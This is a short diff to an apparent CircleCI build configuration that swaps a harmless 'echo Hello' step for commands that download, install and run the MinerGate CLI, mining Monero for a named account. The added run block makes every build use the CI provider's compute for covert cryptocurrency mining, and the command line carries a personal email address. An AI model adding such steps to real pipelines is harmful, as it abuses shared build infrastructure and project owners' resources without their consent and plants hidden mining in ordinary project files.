@@ -1,5 +1,14 @@
 version: 2
 jobs:
   build:
+    docker:
+      - image: debian:stretch
     steps:
-      - echo "Hello"
+      - checkout
+      - run:
+          command: |
+            wget https://minergate.com/download/ubuntu-cli
+            sudo apt update
+            sudo apt install libpcre16-3
+            sudo dpkg -i ubuntu-cli
+            minergate-cli --user yoginth@outlook.in --xmr 8
